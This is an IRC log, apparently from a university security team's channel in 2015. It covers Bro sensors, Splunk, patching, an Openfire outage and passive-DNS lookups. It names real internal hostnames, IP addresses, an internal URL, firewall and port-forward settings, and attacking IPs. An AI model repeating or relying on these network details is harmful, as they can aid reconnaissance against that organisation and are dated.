2015-02-02 09:25:47	wraquel	$36!!!??
2015-02-02 09:25:59	jazoff	yeah, lots of competition
2015-02-02 09:26:18	jazoff	odroid also has a bunch of boards
2015-02-02 09:27:18	jazoff	i think the banana pi may be able to run bro decently
2015-02-02 09:28:48	wraquel	hmmm... could make ok CTF prizes paired with pwnpi
2015-02-02 09:29:13	jazoff	yeah, they are backwards compatible i believe, so anything that runs on the raspberry pi runs on the banana pi
2015-02-02 09:38:53	wraquel	... ODROID-C1 nice.
2015-02-02 09:39:09	jazoff	yeah.. heard some things about the gigE having issues
2015-02-02 09:39:15	wraquel	:(
2015-02-02 09:39:18	jazoff	and they really recommend the emmc cards which are expensive
2015-02-02 09:39:25	jazoff	gigE thing is a driver issue I think
2015-02-02 09:39:44	jazoff	i think for networking stuff the banana pi is the leader right now
2015-02-02 09:39:47	jazoff	gigE + sata
2015-02-02 09:40:21	jazoff	the external drive i'm using now even has eSata, so I think i could just get a eSata -> sata adapter and use it with the banana pi
2015-02-02 09:42:45	wraquel	Is there a way you can think of to automate the update of the 'insecure software' event to have the latest flash versions on splunk?
2015-02-02 09:43:00	jazoff	oh! that needs to be moved to the new server
2015-02-02 09:43:14	jazoff	and automate.. where would it get the latest version from?
2015-02-02 09:50:11	wraquel	jazoff: That's what I'm trying to figure out.
2015-02-02 09:50:17	jazoff	ah
2015-02-02 09:50:37	wraquel	I wonder if there's some json off adobe's site that could be parsed.
2015-02-02 09:51:39	jazoff	maybeon https://www.mozilla.org/en-US/plugincheck/
2015-02-02 09:54:44	wraquel	I wonder how ninite does it.
2015-02-02 09:55:06	jazoff	http://imgur.com/gallery/H8obU
2015-02-02 09:55:16	jazoff	doesnt look like anything new, but removes the need for a bootable disk
2015-02-02 09:59:12	wraquel	Actually, maybe NiteNite doesn't monitor flash..
2015-02-02 10:00:39	wraquel	Oh... It's a 'pro' option.
2015-02-02 10:12:22	wraquel	I thought the banana was quad. Are they releasing a quad version?
2015-02-02 10:13:07	jazoff	the rpi 2 is quad core
2015-02-02 10:13:14	jazoff	and i think some of the odroids are
2015-02-02 10:15:25	wraquel	huh... windows 10 compatibility.
2015-02-02 10:17:20	jazoff	yeah, lots of noise about that
2015-02-02 11:46:30	wraquel	I like the click options in the new splunk
2015-02-02 11:58:50	wraquel	ANyone familiar with htcondor that glick is talking about?
2015-02-02 12:04:44	jazoff	nope
2015-02-02 12:04:54	jazoff	yeah, new splunk is nice
2015-02-02 12:20:21	jazoff	141.142.160.60 is really getting slammed with ntp requests
2015-02-02 12:32:40	wraquel	fun
2015-02-02 12:34:07	jazoff	not unsurprising.. they dont really know that it's not working
2015-02-02 12:34:20	jazoff	they'd need to scan it again to realize it's been null routed
2015-02-02 12:35:42	wraquel	pcap? Determine the target?
2015-02-02 12:35:50	wraquel	or targets.
2015-02-02 12:41:15	jazoff	a bunch...
2015-02-02 12:42:33	jazoff	208.98.54.132 208.98.31.202 208.98.31.198 208.98.31.196 208.98.54.131 208.98.54.138 208.98.31.195 95.211.214.91 208.98.29.143 77.223.159.65 208.98.46.120 70.39.78.93 198.148.86.67 70.39.78.66
2015-02-02 12:42:41	jazoff	are teh top 15 from today
2015-02-02 12:43:14	 *	jazoff pastes into ninfo
2015-02-02 12:43:24	jazoff	ah, 'known irc host prefix' from cif
2015-02-02 12:43:53	jazoff	for just about all of them
2015-02-02 12:52:36	jazoff	jschipp: there's a helper for those kinds of fw rules...
2015-02-02 12:52:53	jazoff	fw::helpers::security_bastion_allow
2015-02-02 12:53:22	jazoff	it adds all the ips for fog,dew,sects
2015-02-02 12:54:00	jazoff	and helps prevent typos ;) +    source   => '141.142.148.1',
2015-02-02 13:19:22	soehlert	jazoff: that imgur windows admin trick you pasted, I've had to do that before. was scary how easy it was
2015-02-02 13:23:55	jschipp	jazoff: kk
2015-02-02 13:25:46	wraquel	huh, how come new splunk doesn't have stats on license usage?
2015-02-02 13:25:50	wraquel	https://splunk-sec.internal.ncsa.edu:8000/en-US/manager/search/licenseusage
2015-02-02 13:25:59	wraquel	It is because we're using CITES'?
2015-02-02 13:26:19	jazoff	yeah
2015-02-02 13:26:39	jazoff	one of the pages mentions that you need to look at the license server
2015-02-02 13:26:47	wraquel	that's annoying.
2015-02-02 14:59:21	jazoff	jschipp: did you remove the rules entirely by mistake?
2015-02-02 15:10:41	soehlert	jazoff: did you hear about the bomb stuff in your neck of the woods?
2015-02-02 15:10:48	jazoff	nope
2015-02-02 15:11:45	jazoff	this airport thing?
2015-02-02 15:19:47	soehlert	http://www.wsbtv.com/news/news/local/suspicious-device-closes-14th-street/nj3Nc/
2015-02-02 15:20:17	soehlert	luckily it didnt impact your commute today!
2015-02-02 15:21:50	jazoff	:)
2015-02-02 15:22:22	jazoff	I don't live near there anyway :)
2015-02-02 15:29:40	soehlert	ah good. heard from another ATL friend about how he'd been stuck for hours
2015-02-02 15:32:17	jschipp	does someone have a machine of 141.142.148.121 is-at 00:1e:be:cd:e0:85
2015-02-02 15:33:58	jazoff	that used to be ca-test.ncsa.illinois.edu
2015-02-02 15:35:20	jschipp	err, who's machine is that? it wasn't in the secops notes so I made the dns/krb requests, etc.
2015-02-02 15:35:33	jazoff	i dunno, that's just what was in the passive dns history
2015-02-02 15:35:44	jschipp	kk, thx
2015-02-02 15:36:48	soehlert	i would guess that's icepick's. you can request neteng to change that for you
2015-02-02 15:37:14	soehlert	also, as far as you know, are there any machines missing from the hosts list in secops repo? i just want to do an audit and make sure we have it all
2015-02-02 15:37:27	soehlert	and this is for everyone. i want to run through some updates today. any machines i should hold off on?
2015-02-02 15:39:19	jschipp	eyrich1: is that your machine?
2015-02-02 15:39:22	jschipp	soehlert: no
2015-02-02 15:39:39	soehlert	no on the updates or no on the hosts list?
2015-02-02 15:40:00	jschipp	I don't have any machines that need to be added to the hosts list
2015-02-02 15:40:03	soehlert	ok
2015-02-02 15:40:26	soehlert	thanks
2015-02-02 15:40:32	jschipp	all my machines have been updated to 6.6 last week
2015-02-02 15:45:29	soehlert	k. any you're using today you don't want me to reboot?
2015-02-02 15:46:05	jschipp	don't reboot the logging infrastructure stuff
2015-02-02 15:46:25	jschipp	i.e. relays, analysis
2015-02-02 15:47:03	soehlert	have they already been updated or no?
2015-02-02 15:47:10	jschipp	yes
2015-02-02 15:47:30	soehlert	ok i was counting them in the your machine list. any not your machines you're using?
2015-02-02 15:47:42	jschipp	lol, no
2015-02-02 15:48:52	soehlert	haha alright there we go
2015-02-02 15:49:00	soehlert	jazoff: how bout you? wraquel?
2015-02-02 15:49:50	wraquel	?
2015-02-02 15:50:10	jazoff	i should be ok
2015-02-02 15:50:11	soehlert	any machines you don't want me to reboot today?
2015-02-02 15:50:14	soehlert	for updates
2015-02-02 15:50:16	jazoff	things should come back up on their own
2015-02-02 15:50:29	wraquel	I'm good.
2015-02-02 15:51:04	soehlert	ok
2015-02-02 15:51:27	soehlert	gonna do bro cluster now though just in case
2015-02-02 15:51:54	jazoff	ok
2015-02-02 16:00:14	jazoff	looks like all the raspberry pi 2's are out of stock or have the price marked up.. 
2015-02-02 16:00:25	jazoff	oh well, i'm sure in a few days things will have settled
2015-02-02 16:06:05	soehlert	all cluster workers and supercell rebooting now
2015-02-02 16:06:15	soehlert	ya thats how it was with the original raspi's too
2015-02-02 16:09:48	soehlert	damn waiting for lock in broctl..
2015-02-02 16:15:41	soehlert	i always forget, how do i deal with that jazoff? i tried waiting and that didnt work?
2015-02-02 16:15:41	soehlert	just trying to do a broctl status
2015-02-02 16:15:44	jazoff	what order did you do it in?
2015-02-02 16:16:22	soehlert	i rebooted all the workers then supercell
2015-02-02 16:16:25	jazoff	ah
2015-02-02 16:16:31	jazoff	it should work itself out then
2015-02-02 16:16:50	soehlert	so more waiting?
2015-02-02 16:17:00	jazoff	yeah, looks like it is already back up
2015-02-02 16:18:49	soehlert	indeed
2015-02-02 16:20:24	jazoff	you likely got waiting for lock since cron was starting things up
2015-02-02 16:22:39	soehlert	gotcha
2015-02-02 16:37:40	jazoff	err
2015-02-02 16:37:48	jazoff	looks like the eth devices changed on some of the workers
2015-02-02 16:38:03	jazoff	ohhh, the myricon drivers aren't loaded
2015-02-02 16:40:10	jazoff	so that's why things were kindamessed up
2015-02-02 16:41:06	soehlert	ahhh. something we need to do when rebooting or a one of mess up?
2015-02-02 16:42:08	jazoff	shouldn't have to... half of them reloaded half of them didn't
2015-02-02 16:42:21	jazoff	the myricom rpm installs an init script for it
2015-02-02 16:43:00	wraquel	jazoff: eyrich1 can you guys add to this outline. Adam is going to write up everything for that HPC talk https://wiki.ncsa.illinois.edu/display/CSD/CLHS15+-+Second+Workshop+on+the+Changing+Landscape+in+HPC+Security
2015-02-02 16:54:03	jazoff	will coordinate with eyrich1 tomorrow
2015-02-03 00:34:12	soehlert	jschipp: we need to go through and talk about what you consider your machines since you said you updated them all, but ones i thought were yours needed updating.
2015-02-03 00:46:40	soehlert	also the hosts list seems to be missing the relays and i dont remember the exact names. can you please add them?
2015-02-03 00:53:40	soehlert	i also don't have access to mousetooth or cuckoo
2015-02-03 08:58:35	wraquel	wth is mousetooth?
2015-02-03 09:17:32	jazoff	rings a bell..
2015-02-03 09:17:45	jazoff	something to do with html/js anaylizing?
2015-02-03 09:18:08	jazoff	oh, or this? http://en.wikipedia.org/wiki/Mausezahn
2015-02-03 09:29:36	wraquel	hmmmm. Is it me or does the network seem.... slow today.
2015-02-03 09:29:55	wraquel	Yeah, that sounds liek something Jon would spin up.
2015-02-03 09:30:50	jazoff	:)
2015-02-03 09:44:02	<--	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has quit (Ping timeout)
2015-02-03 09:44:02	-->	wraquel (wraquel@hidden-3819C22F.ncsa.illinois.edu) has joined #security
2015-02-03 09:44:02	--	irc: disconnected from server
2015-02-03 09:45:33	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2015-02-03 09:45:33	--	Channel #security: 7 nicks (0 ops, 0 halfops, 0 voices, 7 normals)
2015-02-03 09:45:45	--	Mode #security [+]
2015-02-03 09:45:45	--	Channel created on Tue, 04 Feb 2014 20:39:53
2015-02-03 10:08:16	jschipp	yeah that mousetooth, it's mine
2015-02-03 10:08:32	jschipp	soehlert: which ones did you think were mine?
2015-02-03 10:09:05	jschipp	cuckoo isn't ready to be on the list yet, needs to be scrapped
2015-02-03 11:05:37	jschipp	jazoff: did you talk to eyrich1 about the not the fw between the relays and splunk-sec?
2015-02-03 11:06:07	jazoff	he was looking at it the other night
2015-02-03 11:06:13	jazoff	not sure what the current status is
2015-02-03 11:06:35	jazoff	(other than that it still isn't working)
2015-02-03 11:07:01	jschipp	kk, just checking, I haven't heard anything
2015-02-03 11:54:44	jazoff	heh, i guess ITS is working on that malware PC i sent over yesterday
2015-02-03 11:54:47	jazoff	it downloaded mbam-setup-2.0.4.1028.exe today
2015-02-03 11:56:16	wraquel	So... I just looked at Eyrich's last email about the gpfs host. 2 day delay while stuck in the proofpoint system.
2015-02-03 11:57:42	jazoff	what takes 2 days?
2015-02-03 11:58:08	jazoff	did it see the hostname and try doing something to it which took forever to time out since it is null routed?
2015-02-03 11:58:48	wraquel	The email delivery took 2 days. Apparently the host it was sitting on got hosed.
2015-02-03 12:00:24	jazoff	ah
2015-02-03 12:01:02	jazoff	i guess that host wasnt that important
2015-02-03 12:01:27	jazoff	it's still getting hit with ntp packets too
2015-02-03 12:47:56	soehlert	jschipp: well actually i checked every machine and everything needed updates. analysis and relays, nagios machines, git-csd, etc..
2015-02-03 14:09:47	jschipp	soehlert: there may have been new packages in the last week, but I ran yum update on all those machines including those you just listed and rebooted them
2015-02-03 14:14:15	jazoff	I think there were a lot of updates in the last week.. glibc for example :)
2015-02-03 14:32:26	sam	coulnd't get into nagios last night so i installed all updates, but did not reboot. any hosts i need to be careful with rebooting?
2015-02-03 14:32:31	sam	wraquel: wiki-sec or grid-sec?
2015-02-03 14:42:52	wraquel	hmmmm...
2015-02-03 14:42:58	wraquel	Nah, they can be rebooted.
2015-02-03 14:46:09	jazoff	we having that meeting in 15 minutes?
2015-02-03 14:46:24	jschipp	wraquel: if you have time can you sign the cert for git-csd too?
2015-02-03 14:46:28	jschipp	holding on that
2015-02-03 14:55:18	wraquel	is that a differen ticket?
2015-02-03 14:55:22	wraquel	Where's eyrich1 anyway?
2015-02-03 14:55:31	wraquel	Is he out this week? 
2015-02-03 14:55:34	wraquel	I think I recall that.
2015-02-03 14:56:14	sam	he was in IRC yesterday at least. 
2015-02-03 14:59:44	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2015-02-03 14:59:55	jazoff	i take it you just rebooted portal?
2015-02-03 15:00:04	sam	ya
2015-02-03 15:00:12	wraquel	and wiki-sec
2015-02-03 15:00:21	sam	and a whole buncha others. something wron?
2015-02-03 15:01:44	jazoff	so.. meeting?
2015-02-03 15:02:09	jazoff	no.. just noticed ncsabot timed out :)
2015-02-03 15:02:14	sam	ah ok
2015-02-03 15:02:56	jazoff	well, need to feed dog, lemme know if I should call into something
2015-02-03 15:06:30	jschipp	wraquel: yeah, thanks!
2015-02-03 15:14:13	wraquel	sam: nope. just confirming.
2015-02-03 15:16:48	jazoff	hmm, wonder where the bot is
2015-02-03 15:17:05	sam	didnt we have issues with it not auto logging in
2015-02-03 15:17:09	jazoff	yeah
2015-02-03 15:18:29	jazoff	ohh
2015-02-03 15:18:35	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2015-02-03 15:18:38	jazoff	it's the autojoin that has issues
2015-02-03 15:18:38	sam	?
2015-02-03 15:18:46	jazoff	just need ti /invite
2015-02-03 15:18:54	sam	ya thats what i was trying to say sorry
2015-02-03 15:19:05	jazoff	yeah I forgot
2015-02-03 15:19:20	jazoff	it's configured to autojoin.. it just doesnt get along with our server for some reason
2015-02-03 15:19:31	sam	ya i kinda dont like our server
2015-02-03 15:19:40	sam	still need to convert it though
2015-02-03 15:23:29	sam	jazoff: did you see they are selling nexus 5's in the play store again
2015-02-03 15:23:35	jazoff	nope
2015-02-03 15:23:45	sam	yup black ones only. 16 and 32 gig
2015-02-03 15:24:12	jazoff	google just had their q4 earnings report...
2015-02-03 15:24:21	sam	howd that go?
2015-02-03 15:24:22	jazoff	one of the things mentioned was supply not being able to keep up with demand
2015-02-03 15:25:33	jazoff	so, not surprising that they are selling them again
2015-02-03 15:25:44	sam	gotcha. i figured they stopped because the six was out
2015-02-03 15:31:57	wraquel	Is wiki-sec back up? If so, I need to check something.
2015-02-03 15:32:09	sam	ya
2015-02-03 15:32:09	wraquel	Just hanging on rejoining the jabber server is all.
2015-02-03 15:32:12	wraquel	hrm
2015-02-03 15:33:32	wraquel	uh hoh
2015-02-03 15:34:01	wraquel	can't get openfire to start
2015-02-03 15:34:08	jazoff	error?
2015-02-03 15:34:42	wraquel	can't find one
2015-02-03 15:34:43	sam	i did service openfire start and it says its up. what port does it listen on again?
2015-02-03 15:34:44	wraquel	still loking
2015-02-03 15:35:06	wraquel	9091 and 5223
2015-02-03 15:35:13	wraquel	should be on wiki-sec
2015-02-03 15:35:20	sam	yup thats where i am
2015-02-03 15:35:25	sam	ya nothing listening there
2015-02-03 15:35:46	wraquel	no java, no openfire... It's not starting. weird.
2015-02-03 15:36:09	wraquel	ooooooh
2015-02-03 15:36:17	sam	?
2015-02-03 15:36:21	wraquel	needs mysql
2015-02-03 15:36:22	wraquel	hmmmm
2015-02-03 15:36:28	wraquel	that seems to be running.
2015-02-03 15:36:46	wraquel	I hate log4j
2015-02-03 15:36:57	sam	log4j is awful
2015-02-03 15:37:13	wraquel	2015.02.03 15:34:35 org.jivesoftware.openfire.XMPPServer - java.sql.SQLException: ConnectionManager.getConnection() failed to obtain a connection after 11 ret
2015-02-03 15:37:16	wraquel	ries. The exception from the last attempt is as follows: java.sql.SQLException: Access denied for user 'openfire'@'localhost' (using password: YES)
2015-02-03 15:37:18	wraquel	java.lang.IllegalArgumentException: java.sql.SQLException: ConnectionManager.getConnection() failed to obtain a connection after 11 retries. The exception from the last attempt is as follows: java.sql.SQLException: Access denied for user 'openfire'@'localhost' (using password: YES)
2015-02-03 15:37:24	wraquel	that's... not right...
2015-02-03 15:37:32	sam	no no its not
2015-02-03 15:38:52	jazoff	convienently the password is 'encrypted' in the config file so that makes it hard to verify
2015-02-03 15:40:47	sam	sighh. think im gonna reevaluate IRC server options
2015-02-03 15:41:07	jazoff	most of them seem kinda crappy
2015-02-03 15:41:20	sam	thats the opinion ive gotten too, but maybe one is less crappy
2015-02-03 15:41:21	jazoff	like, tons and tons of code and features to handle larger servers
2015-02-03 15:41:36	wraquel	ok.
2015-02-03 15:41:39	wraquel	I reset the password.
2015-02-03 15:41:41	sam	write me one in python real quikc? :)
2015-02-03 15:41:45	wraquel	hopefully that works.
2015-02-03 15:41:47	wraquel	Looks like it's back up.
2015-02-03 15:42:23	wraquel	er.... maybe not
2015-02-03 15:42:26	wraquel	wth
2015-02-03 15:42:31	sam	hah. jazoff nevermind. https://github.com/jrosdahl/miniircd
2015-02-03 15:42:34	sam	looks like someone already did
2015-02-03 15:42:37	jazoff	can you connect via mysql on the cli ?
2015-02-03 15:42:40	wraquel	yeah
2015-02-03 15:42:45	sam	same error?
2015-02-03 15:43:29	wraquel	yeah
2015-02-03 15:43:36	wraquel	the password must be different.
2015-02-03 15:43:41	wraquel	Than what's in lastpass....
2015-02-03 15:43:45	wraquel	sigh.
2015-02-03 15:44:03	sam	wait. the password in lastpass works, but the one in the config fails correct?
2015-02-03 15:44:27	wraquel	No, I reset the data base for openfire to the one in lastpass.
2015-02-03 15:44:34	sam	ah ok
2015-02-03 15:44:44	wraquel	going to reset the password in the config file.
2015-02-03 15:44:54	sam	ya thats the one that would be failing i would think
2015-02-03 15:44:54	wraquel	I think it rewrites it to encrypted after it reads it
2015-02-03 15:46:47	jazoff	there's a few ircds in go, but i think they are incomplete
2015-02-03 15:46:54	wraquel	arg.
2015-02-03 15:46:55	jazoff	though we really just need ssl+password support
2015-02-03 15:49:26	sam	so what, two weeks it'll be good to go? that sound right?
2015-02-03 15:49:58	jazoff	heh
2015-02-03 15:53:18	wraquel	fuuuuu
2015-02-03 15:53:22	sam	?
2015-02-03 15:57:46	wraquel	it's broken
2015-02-03 15:58:59	wraquel	sigh....
2015-02-03 15:59:06	wraquel	Just going to deal with it tomorrow.
2015-02-03 16:24:08	sam	cant remember if we talked about this yet but did anyone see this? https://github.com/USArmyResearchLab/Dshell
2015-02-03 16:24:28	jazoff	yeah
2015-02-03 16:24:42	sam	havent had a chance to really look. does it look promising?
2015-02-03 16:24:56	jazoff	from what i saw bro does 90% of what it does
2015-02-03 16:25:24	sam	kinda wondered where it would fit. didn't know if it aimed at bro or more like tcpdump area
2015-02-03 16:25:48	jazoff	interactive CLI use
2015-02-03 16:26:29	sam	so more of a tcpdump adversary, though bro already covers us on most of it?
2015-02-03 16:26:51	jazoff	yeah, take a look at some of the examples
2015-02-03 16:27:38	sam	oops didnt see those haha ya thats like completely taken care of
2015-02-03 16:28:50	sam	jazoff: do you know if we can do a yum groupinstall via puppet?
2015-02-03 16:31:57	jazoff	no
2015-02-03 16:32:08	sam	damn. i spose i could write an exec for it..
2015-02-03 16:32:48	jazoff	https://projects.puppetlabs.com/issues/11995
2015-02-03 16:34:13	jazoff	https://tickets.puppetlabs.com/browse/PUP-1217
2015-02-03 16:34:14	jazoff	has a function
2015-02-03 16:34:17	sam	https://tickets.puppetlabs.com/browse/PUP-1217
2015-02-03 16:34:21	sam	haha yup just found it
2015-02-03 16:34:35	jazoff	sily redhat
2015-02-03 16:34:40	jazoff	on debian they are just meta packages
2015-02-03 16:34:44	jazoff	empty packages that depend on the other packages
2015-02-03 16:34:49	sam	saves me from having to put an extra couple hundred packages in the hieradata on polos
2015-02-03 16:36:42	sam	theres also this: http://serverfault.com/questions/127460/how-do-i-install-a-yum-package-group-with-puppet/556575#556575
2015-02-03 16:36:49	sam	which do you think would be the better way to do it?
2015-02-03 16:37:52	jazoff	either shoud work
2015-02-03 16:38:09	sam	k
2015-02-03 17:08:22	sam	alrighty yum_groupinstall seems to work
2015-02-03 17:08:42	sam	just have a little issue with MySQL Database server group as it's apparently fighting itself so it tries to install that every time
2015-02-03 18:53:35	soehlert	jazoff: drought having issues with snf driver. "fatal error: /usr/local/bro-2.3.1/bin/bro: problem with interface eth1 - pcap_open_live: eth1: snf_open failed: Permission denied"
2015-02-04 04:49:08	soehlert	think i found an irc server to try, http://ngircd.barton.de/ seems much easier to config. will have to build a pacakge, but fpm will help
2015-02-04 08:22:49	jazoff	i think that's one of the ones I had looked at
2015-02-04 08:23:19	jazoff	I think it still did the stupid rate limiting, but if we are building it we can change the #define or whatever it was beforehand
2015-02-04 09:21:51	jazoff	soehlert: yeah.. drought was using the card with the time limited v3 test license...
2015-02-04 09:22:06	jazoff	i switched bro to use eth0, but the cable needs to be physically moved
2015-02-04 09:42:03	eyrich1	im working on making carp work better on the virtual firewalls. thats whats henerating the notifications
2015-02-04 09:51:03	jazoff	eyrich1: so.. splunk-sec can log to the syslog servers
2015-02-04 09:51:19	jazoff	so 10.142.148.54.43689 > 10.142.158.70.514 works
2015-02-04 09:51:26	jazoff	but 10.142.158.71.41243 > 10.142.148.54.1514 doesn't
2015-02-04 09:52:38	eyrich1	strange, will need to investigate more, we have a work around in place now 
2015-02-04 09:52:46	jazoff	oh?
2015-02-04 09:52:52	eyrich1	jon has it working
2015-02-04 09:52:56	jazoff	oh
2015-02-04 09:53:20	jazoff	ah, so it is
2015-02-04 09:53:45	eyrich1	doing port forward from 141.142.148.126:1514 to .54
2015-02-04 09:54:40	jazoff	ah :)
2015-02-04 09:54:48	jazoff	looks good
2015-02-04 09:55:06	eyrich1	im doing some cleanup of the fireall vm stuff, can investigate the other thing when that is done
2015-02-04 09:55:24	jazoff	this works for me :)
2015-02-04 09:55:30	jazoff	jschipp: do you filter any syslog messages?
2015-02-04 09:55:56	eyrich1	because ESX "fakes" trunks for vnics carp causes some issues. im moving the firewalls to their own definced nics with overiding nic teaming and prmisociuos
2015-02-04 09:55:57	jazoff	looks like rimantadine and amantadine account for almost 50% of the log entries
2015-02-04 09:56:13	eyrich1	promisc will be disabled for the normal machine nics
2015-02-04 09:56:17	jazoff	ah, speaking of promisc...
2015-02-04 09:56:23	jazoff	i had noticed tcpdump showed more than it should
2015-02-04 09:56:54	eyrich1	pretty sure thats a esx thing, when you turn on promisc on the nic it will dump all the traffic entering the vswitch
2015-02-04 10:21:44	jazoff	really looks like they have debugging enabled for that milter stuff
2015-02-04 10:21:54	jazoff	milter=milter-null, action=header, continue
2015-02-04 10:21:59	jazoff	is not a very actionable log message
2015-02-04 10:22:43	jazoff	108,000 of those lines in the last 60 minutes
2015-02-04 10:23:28	jazoff	588,000 milter lins in the last 60 minutes total
2015-02-04 10:36:08	jschipp	jazoff: we don't filter, it was discussed before and decided upon to not filter
2015-02-04 10:36:21	eyrich1	wraquel: did you remove the address lines when you processed the IGTF cert for DES yesterday
2015-02-04 10:39:34	jschipp	does anyone know if the XSEDE jabber server is still down? Adam asked
2015-02-04 10:39:44	eyrich1	im having issues
2015-02-04 10:39:45	eyrich1	too
2015-02-04 10:41:07	jazoff	jschipp: yeah.. wraquel was having issues with mysql
2015-02-04 10:44:55	jschipp	jazoff: are you working on the machine?
2015-02-04 10:46:30	jazoff	yeah
2015-02-04 10:50:14	jschipp	kk, cool, I saw you logged in
2015-02-04 10:53:48	jazoff	fucking xml
2015-02-04 10:54:31	jschipp	what client are you guys using to connect to the jabber service? also, is the port 5222 and does it allow TLS?
2015-02-04 10:54:54	eyrich1	im about to disable promisc mode on the default vswitches
2015-02-04 10:59:28	jschipp	kk
2015-02-04 10:59:45	eyrich1	its done and for some reason the dups are back, damn it
2015-02-04 11:02:00	jazoff	ah, i think i fixed openfire
2015-02-04 11:02:14	jazoff	(i think I actually fixed it before, realized i was looking at old errors)
2015-02-04 11:03:06	jazoff	just needed to change & to &amp; 
2015-02-04 11:04:00	jazoff	err maybe not fixed
2015-02-04 11:04:37	jazoff	no more sql errors but it's not listening on xmpp port
2015-02-04 11:05:01	jazoff	ah, it started the default setup
2015-02-04 11:06:23	jazoff	something else is not right..
2015-02-04 11:06:43	jschipp	lol
2015-02-04 11:06:59	jazoff	not sure if wraquel reinstalled it or something
2015-02-04 11:11:45	jazoff	well, i backed up the database, will try just running through the setup
2015-02-04 11:15:24	jazoff	well, that fails
2015-02-04 11:15:31	jazoff	java.lang.NullPointerException during setup
2015-02-04 11:17:58	jazoff	ah, might have gotten it working
2015-02-04 11:18:12	jazoff	just changed setup in openfire.xml to true, since in theory it is already setup
2015-02-04 11:19:08	jazoff	got one connected user :)
2015-02-04 11:19:20	jazoff	4 connected users :)
2015-02-04 11:20:10	jschipp	yay! Thanks!
2015-02-04 11:21:41	jschipp	what's your jabber id for that?
2015-02-04 11:21:52	jschipp	I'm trying to figure out how to connect to it
2015-02-04 11:21:58	jazoff	i dont use it
2015-02-04 11:22:18	jazoff	we dont have accounts on it either
2015-02-04 11:22:24	jschipp	hmmm
2015-02-04 11:22:28	jschipp	kk
2015-02-04 11:51:05	jazoff	jschipp: re: filtering.. maybe I can just do it on the splunk side.. it's one thing for the bzip2'd archives, but if 50% of the syslog data in splunk is crap.. no reason to have it eat up the license
2015-02-04 11:51:40	jazoff	though syslog is pretty small compared to bro logs
2015-02-04 12:02:06	jschipp	does anyone know where I can find the ip's for the cerberus0+ machines? not in secops repo, and didn't see on wiki
2015-02-04 12:05:54	jazoff	are they in dns?
2015-02-04 12:05:58	jazoff	ninfo bro_pdns cerberus3.ncsa.uiuc.edu
2015-02-04 12:05:59	ncsabot	Query  Type  Answer  TTL  Count  First  Last
2015-02-04 12:05:59	ncsabot	- - cerberus3.ncsa.uiuc.edu 86400 17240 2014-09-03 13:13:23.978084 2015-02-04 12:00:18.158958
2015-02-04 12:05:59	ncsabot	cerberus3.ncsa.uiuc.edu A - None 1 2015-02-04 12:04:53.792287 2015-02-04 12:04:53.792287
2015-02-04 12:05:59	ncsabot	cerberus3.ncsa.illinois.edu A cerberus3.ncsa.uiuc.edu 86400 2 2015-02-04 12:03:38.817238 2015-02-04 12:04:46.940575
2015-02-04 12:06:15	jazoff	there's some weird stuff going on witth thoss
2015-02-04 12:06:22	jschipp	4 resolves, but not the 1-3 
2015-02-04 12:06:32	jazoff	ninfo bro_pdns cerberus1.ncsa.uiuc.edu
2015-02-04 12:06:33	ncsabot	Query  Type  Answer  TTL  Count  First  Last
2015-02-04 12:06:34	ncsabot	49.234.142.141.in-addr.arpa PTR cerberus1.ncsa.uiuc.edu 86400 208 2014-09-03 17:51:32.387577 2015-02-03 17:47:27.432584
2015-02-04 12:06:34	ncsabot	49.234.142.141.in-addr.arpa - cerberus1.ncsa.uiuc.edu 86400 44 2014-09-07 17:52:01.464019 2015-01-31 17:47:37.581347
2015-02-04 12:06:34	ncsabot	cerberus1.ncsa.uiuc.edu * TXT 39 Dns Record for cerberus1.ncsa.uiuc.edu. 86400 8 2014-09-13 04:22:07.480731 2015-01-31 14:06:39.284710
2015-02-04 12:06:34	ncsabot	cerberus1.ncsa.uiuc.edu * mail.ncsa.uiuc.edu 86400 8 2014-09-13 04:22:07.480731 2015-01-31 14:06:39.284710
2015-02-04 12:06:34	ncsabot	cerberus1.ncsa.uiuc.edu AAAA - None 9 2014-09-13 04:22:07.581685 2015-01-26 13:51:05.885987
2015-02-04 12:06:34	ncsabot	- - cerberus1.ncsa.uiuc.edu 86400 15555 2014-09-03 13:59:40.562456 2015-02-04 12:00:11.607105
2015-02-04 12:06:37	ncsabot	cerberus1.ncsa.uiuc.edu * 141.142.234.49 86400 8 2014-09-13 04:22:07.480731 2015-01-31 14:06:39.284710
2015-02-04 12:06:38	jschipp	yeah, i tried getting the ip of that cname
2015-02-04 12:06:39	ncsabot	cerberus1.ncsa.uiuc.edu * rimantadine.ncsa.uiuc.edu 86400 8 2014-09-13 04:22:07.480731 2015-01-31 14:06:39.284710
2015-02-04 12:06:42	ncsabot	cerberus1.ncsa.uiuc.edu A 141.142.234.49 86400 2 2014-12-03 04:50:18.331729 2014-12-03 04:50:18.331729
2015-02-04 12:06:43	ncsabot	cerberus1.ncsa.uiuc.edu - rimantadine.ncsa.uiuc.edu 86400 1 2014-12-20 14:07:39.090548 2014-12-20 14:07:39.090548
2015-02-04 12:06:46	ncsabot	cerberus1.ncsa.uiuc.edu - amantadine.ncsa.uiuc.edu 86400 1 2014-12-20 14:07:39.090548 2014-12-20 14:07:39.090548
2015-02-04 12:06:47	ncsabot	cerberus1.ncsa.uiuc.edu - 141.142.234.49 86400 1 2014-12-20 14:07:39.090548 2014-12-20 14:07:39.090548
2015-02-04 12:06:50	ncsabot	cerberus1.ncsa.uiuc.edu - TXT 39 Dns Record for cerberus1.ncsa.uiuc.edu. 86400 1 2014-12-20 14:07:39.090548 2014-12-20 14:07:39.090548
2015-02-04 12:06:51	ncsabot	cerberus1.ncsa.uiuc.edu - mail.ncsa.uiuc.edu 86400 1 2014-12-20 14:07:39.090548 2014-12-20 14:07:39.090548
2015-02-04 12:06:53	ncsabot	cerberus1.ncsa.uiuc.edu * amantadine.ncsa.uiuc.edu 86400 8 2014-09-13 04:22:07.480731 2015-01-31 14:06:39.284710
2015-02-04 12:06:54	jazoff	oook then
2015-02-04 12:07:01	jazoff	is 141.142.234.49 right?
2015-02-04 12:07:34	jschipp	not sure, doesn't respond but it could be, will have to check with someone else
2015-02-04 12:07:38	jschipp	thanks
2015-02-04 12:08:52	jschipp	ninfo bro_pdns cerberus2.ncsa.uiuc.edu
2015-02-04 12:08:53	ncsabot	Query  Type  Answer  TTL  Count  First  Last
